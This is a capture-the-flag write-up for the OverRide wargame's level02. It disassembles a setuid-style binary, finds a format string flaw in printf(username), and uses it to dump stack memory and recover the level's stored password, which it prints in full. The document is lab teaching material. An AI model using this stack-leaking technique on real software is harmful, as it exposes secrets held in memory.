# level02

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```console
level02@OverRide:~$ checksec --file ./level02
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level02
```

```gdb
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0000000000400814 <+0>:      push   rbp
   0x0000000000400815 <+1>:      mov    rbp,rsp
   0x0000000000400818 <+4>:      sub    rsp,0x120
   0x000000000040081f <+11>:     mov    DWORD PTR [rbp-0x114],edi
   0x0000000000400825 <+17>:     mov    QWORD PTR [rbp-0x120],rsi
   0x000000000040082c <+24>:     lea    rdx,[rbp-0x70]
   0x0000000000400830 <+28>:     mov    eax,0x0
   0x0000000000400835 <+33>:     mov    ecx,0xc
   0x000000000040083a <+38>:     mov    rdi,rdx
   0x000000000040083d <+41>:     rep stos QWORD PTR es:[rdi],rax            ; memset(buf_user, '\0', 12)
   0x0000000000400840 <+44>:     mov    rdx,rdi
   0x0000000000400843 <+47>:     mov    DWORD PTR [rdx],eax
   0x0000000000400845 <+49>:     add    rdx,0x4
   0x0000000000400849 <+53>:     lea    rdx,[rbp-0xa0]
   0x0000000000400850 <+60>:     mov    eax,0x0
   0x0000000000400855 <+65>:     mov    ecx,0x5
   0x000000000040085a <+70>:     mov    rdi,rdx
   0x000000000040085d <+73>:     rep stos QWORD PTR es:[rdi],rax            ; memset(buf_file, '\0', 5)
   0x0000000000400860 <+76>:     mov    rdx,rdi
   0x0000000000400863 <+79>:     mov    BYTE PTR [rdx],al
   0x0000000000400865 <+81>:     add    rdx,0x1
   0x0000000000400869 <+85>:     lea    rdx,[rbp-0x110]
   0x0000000000400870 <+92>:     mov    eax,0x0
   0x0000000000400875 <+97>:     mov    ecx,0xc
   0x000000000040087a <+102>:    mov    rdi,rdx
   0x000000000040087d <+105>:    rep stos QWORD PTR es:[rdi],rax            ; memset(buf_pass, '\0', 12)
   0x0000000000400880 <+108>:    mov    rdx,rdi
   0x0000000000400883 <+111>:    mov    DWORD PTR [rdx],eax
   0x0000000000400885 <+113>:    add    rdx,0x4
   0x0000000000400889 <+117>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000400891 <+125>:    mov    DWORD PTR [rbp-0xc],0x0
   0x0000000000400898 <+132>:    mov    edx,0x400bb0
   0x000000000040089d <+137>:    mov    eax,0x400bb2
   0x00000000004008a2 <+142>:    mov    rsi,rdx
   0x00000000004008a5 <+145>:    mov    rdi,rax
   0x00000000004008a8 <+148>:    call   0x400700 <fopen@plt>                ; fopen("/home/users/level03/.pass", "r")
   0x00000000004008ad <+153>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008b1 <+157>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004008b6 <+162>:    jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:    mov    rax,QWORD PTR [rip+0x200991]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>:    mov    rdx,rax
   0x00000000004008c2 <+174>:    mov    eax,0x400bd0
   0x00000000004008c7 <+179>:    mov    rcx,rdx
   0x00000000004008ca <+182>:    mov    edx,0x24
   0x00000000004008cf <+187>:    mov    esi,0x1
   0x00000000004008d4 <+192>:    mov    rdi,rax
   0x00000000004008d7 <+195>:    call   0x400720 <fwrite@plt>               ; fwrite("ERROR: failed to open password file\n", 1, 36, stderr)
   0x00000000004008dc <+200>:    mov    edi,0x1
   0x00000000004008e1 <+205>:    call   0x400710 <exit@plt>                 ; exit(1)
   0x00000000004008e6 <+210>:    lea    rax,[rbp-0xa0]
   0x00000000004008ed <+217>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004008f1 <+221>:    mov    rcx,rdx
   0x00000000004008f4 <+224>:    mov    edx,0x29
   0x00000000004008f9 <+229>:    mov    esi,0x1
   0x00000000004008fe <+234>:    mov    rdi,rax
   0x0000000000400901 <+237>:    call   0x400690 <fread@plt>                ; fread(buf_file, 1, 41, fs)
   0x0000000000400906 <+242>:    mov    DWORD PTR [rbp-0xc],eax
   0x0000000000400909 <+245>:    lea    rax,[rbp-0xa0]
   0x0000000000400910 <+252>:    mov    esi,0x400bf5
   0x0000000000400915 <+257>:    mov    rdi,rax
   0x0000000000400918 <+260>:    call   0x4006d0 <strcspn@plt>              ; strcspn(buf_file, "\n")
   0x000000000040091d <+265>:    mov    BYTE PTR [rbp+rax*1-0xa0],0x0
   0x0000000000400925 <+273>:    cmp    DWORD PTR [rbp-0xc],0x29
   0x0000000000400929 <+277>:    je     0x40097d <main+361>
   0x000000000040092b <+279>:    mov    rax,QWORD PTR [rip+0x20091e]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>:    mov    rdx,rax
   0x0000000000400935 <+289>:    mov    eax,0x400bf8
   0x000000000040093a <+294>:    mov    rcx,rdx
   0x000000000040093d <+297>:    mov    edx,0x24
   0x0000000000400942 <+302>:    mov    esi,0x1
   0x0000000000400947 <+307>:    mov    rdi,rax
   0x000000000040094a <+310>:    call   0x400720 <fwrite@plt>               ; fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
   0x000000000040094f <+315>:    mov    rax,QWORD PTR [rip+0x2008fa]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>:    mov    rdx,rax
   0x0000000000400959 <+325>:    mov    eax,0x400bf8
   0x000000000040095e <+330>:    mov    rcx,rdx
   0x0000000000400961 <+333>:    mov    edx,0x24
   0x0000000000400966 <+338>:    mov    esi,0x1
   0x000000000040096b <+343>:    mov    rdi,rax
   0x000000000040096e <+346>:    call   0x400720 <fwrite@plt>               ; fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
   0x0000000000400973 <+351>:    mov    edi,0x1
   0x0000000000400978 <+356>:    call   0x400710 <exit@plt>                 ; exit(1)
   0x000000000040097d <+361>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400981 <+365>:    mov    rdi,rax
   0x0000000000400984 <+368>:    call   0x4006a0 <fclose@plt>               ; fclose(fs)
   0x0000000000400989 <+373>:    mov    edi,0x400c20                        ; print the
   0x000000000040098e <+378>:    call   0x400680 <puts@plt>                 ;
   0x0000000000400993 <+383>:    mov    edi,0x400c50                        ; start
   0x0000000000400998 <+388>:    call   0x400680 <puts@plt>                 ;
   0x000000000040099d <+393>:    mov    edi,0x400c80                        ; program
   0x00000000004009a2 <+398>:    call   0x400680 <puts@plt>                 ;
   0x00000000004009a7 <+403>:    mov    edi,0x400cb0                        ; message
   0x00000000004009ac <+408>:    call   0x400680 <puts@plt>                 ;
   0x00000000004009b1 <+413>:    mov    eax,0x400cd9
   0x00000000004009b6 <+418>:    mov    rdi,rax
   0x00000000004009b9 <+421>:    mov    eax,0x0
   0x00000000004009be <+426>:    call   0x4006c0 <printf@plt>               ; printf("--[ Username:")
   0x00000000004009c3 <+431>:    mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:    mov    rdx,rax
   0x00000000004009cd <+441>:    lea    rax,[rbp-0x70]
   0x00000000004009d1 <+445>:    mov    esi,0x64
   0x00000000004009d6 <+450>:    mov    rdi,rax
   0x00000000004009d9 <+453>:    call   0x4006f0 <fgets@plt>                ; fgets(buf_user, 100, stdin)
   0x00000000004009de <+458>:    lea    rax,[rbp-0x70]
   0x00000000004009e2 <+462>:    mov    esi,0x400bf5
   0x00000000004009e7 <+467>:    mov    rdi,rax
   0x00000000004009ea <+470>:    call   0x4006d0 <strcspn@plt>              ; strcspn(buf_user, "\n");
   0x00000000004009ef <+475>:    mov    BYTE PTR [rbp+rax*1-0x70],0x0
   0x00000000004009f4 <+480>:    mov    eax,0x400ce8
   0x00000000004009f9 <+485>:    mov    rdi,rax
   0x00000000004009fc <+488>:    mov    eax,0x0
   0x0000000000400a01 <+493>:    call   0x4006c0 <printf@plt>               ; printf("--[ Password:")
   0x0000000000400a06 <+498>:    mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:    mov    rdx,rax
   0x0000000000400a10 <+508>:    lea    rax,[rbp-0x110]
   0x0000000000400a17 <+515>:    mov    esi,0x64
   0x0000000000400a1c <+520>:    mov    rdi,rax
   0x0000000000400a1f <+523>:    call   0x4006f0 <fgets@plt>                ; fgets(buf_pass, 100, stdin)
   0x0000000000400a24 <+528>:    lea    rax,[rbp-0x110]
   0x0000000000400a2b <+535>:    mov    esi,0x400bf5
   0x0000000000400a30 <+540>:    mov    rdi,rax
   0x0000000000400a33 <+543>:    call   0x4006d0 <strcspn@plt>              ; strcspn(buf_pass, "\n")
   0x0000000000400a38 <+548>:    mov    BYTE PTR [rbp+rax*1-0x110],0x0
   0x0000000000400a40 <+556>:    mov    edi,0x400cf8
   0x0000000000400a45 <+561>:    call   0x400680 <puts@plt>                 ; puts 41 '*'
   0x0000000000400a4a <+566>:    lea    rcx,[rbp-0x110]
   0x0000000000400a51 <+573>:    lea    rax,[rbp-0xa0]
   0x0000000000400a58 <+580>:    mov    edx,0x29
   0x0000000000400a5d <+585>:    mov    rsi,rcx
   0x0000000000400a60 <+588>:    mov    rdi,rax
   0x0000000000400a63 <+591>:    call   0x400670 <strncmp@plt>              ; strncmp(buf_file, buf_pass, 41)
   0x0000000000400a68 <+596>:    test   eax,eax
   0x0000000000400a6a <+598>:    jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>:    mov    eax,0x400d22
   0x0000000000400a71 <+605>:    lea    rdx,[rbp-0x70]
   0x0000000000400a75 <+609>:    mov    rsi,rdx
   0x0000000000400a78 <+612>:    mov    rdi,rax
   0x0000000000400a7b <+615>:    mov    eax,0x0
   0x0000000000400a80 <+620>:    call   0x4006c0 <printf@plt>               ; printf("Greetings, %s!\n", buf_user)
   0x0000000000400a85 <+625>:    mov    edi,0x400d32
   0x0000000000400a8a <+630>:    call   0x4006b0 <system@plt>               ; system("/bin/sh")
   0x0000000000400a8f <+635>:    mov    eax,0x0
   0x0000000000400a94 <+640>:    leave
   0x0000000000400a95 <+641>:    ret
   0x0000000000400a96 <+642>:    lea    rax,[rbp-0x70]
   0x0000000000400a9a <+646>:    mov    rdi,rax
   0x0000000000400a9d <+649>:    mov    eax,0x0
   0x0000000000400aa2 <+654>:    call   0x4006c0 <printf@plt>               ; printf(buf_user)
   0x0000000000400aa7 <+659>:    mov    edi,0x400d3a
   0x0000000000400aac <+664>:    call   0x400680 <puts@plt>                 ; puts(" does not have access!")
   0x0000000000400ab1 <+669>:    mov    edi,0x1
   0x0000000000400ab6 <+674>:    call   0x400710 <exit@plt>                 ; exit(1)
End of assembler dump.
```

Basically, this program opens the `.pass` file that contains the flag we look for, put its content to a buffer declared
on stack, gets a username and a password from the standard input, then spawn a shell if the password entered by the user
is equal to the `.pass` file content.

The first clue we get from this is that the flag is stored in a buffer on the stack, so maybe we can find a way to read
this buffer.

Here, the vulnerability comes from `printf` which is called at the end of the program, when the password provided is
different from the one of `.pass`, and only takes one argument, the username acquired from the standard input. We will
use a python script (`Resources` folder attached) to dump the stack thanks to a format string attack. By doing so, we
hope to reach the buffer used to read the content of the `.pass` file. Let's try this!

## Exploit

```console
level02@OverRide:~$ python /tmp/dump_stack.py
Segmentation fault (core dumped)                ; we reach the top of the stack
Segmentation fault (core dumped)                ; so the following trials
Segmentation fault (core dumped)                ; are out of bounds
Segmentation fault (core dumped)                ; and make the program crashes
[...]
level02@OverRide:~$ cat /tmp/level02_dump
=== 1 : 7fffffffe4d0 does not have access!
=== 2 : 0 does not have access!
=== 3 : 0 does not have access!
=== 4 : 2a2a2a2a2a2a2a2a does not have access!
=== 5 : 2a2a2a2a2a2a2a2a does not have access!
=== 6 : 7fffffffe6c8 does not have access!
=== 7 : 1f7ff9a08 does not have access!
=== 8 : 0 does not have access!
=== 9 : 0 does not have access!
=== 10 : 0 does not have access!
=== 11 : 0 does not have access!
=== 12 : 0 does not have access!
=== 13 : 0 does not have access!
=== 14 : 0 does not have access!
=== 15 : 0 does not have access!
=== 16 : 0 does not have access!
=== 17 : 0 does not have access!
=== 18 : 0 does not have access!
=== 19 : 0 does not have access!
=== 20 : 100000000 does not have access!
=== 21 : 0 does not have access!
=== 22 : 756e505234376848 does not have access!
=== 23 : 45414a3561733951 does not have access!
=== 24 : 377a7143574e6758 does not have access!
=== 25 : 354a35686e475873 does not have access!
=== 26 : 48336750664b394d does not have access!
=== 27 : 0 does not have access!
=== 28 : 786c24383225 does not have access!
=== 29 : 0 does not have access!
=== 30 : 0 does not have access!
[...]
```

We take a look at the dumping file and notice a 5 blocks raw wich seems to contain ascii characters (22th to 26th
argument). Once again we use python in order to convert the values from hexadecimal to ascii and reverse the bytes of
each block, according to the binary endianness.

```python
>>> "756e505234376848".decode("hex")[::-1]
'Hh74RPnu'
>>> "45414a3561733951".decode("hex")[::-1]
'Q9sa5JAE'
>>> "377a7143574e6758".decode("hex")[::-1]
'XgNWCqz7'
>>> "354a35686e475873".decode("hex")[::-1]
'sXGnh5J5'
>>> "48336750664b394d".decode("hex")[::-1]
'M9KfPg3H'
```

Finally, we join the five string parts to get the flag : "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H".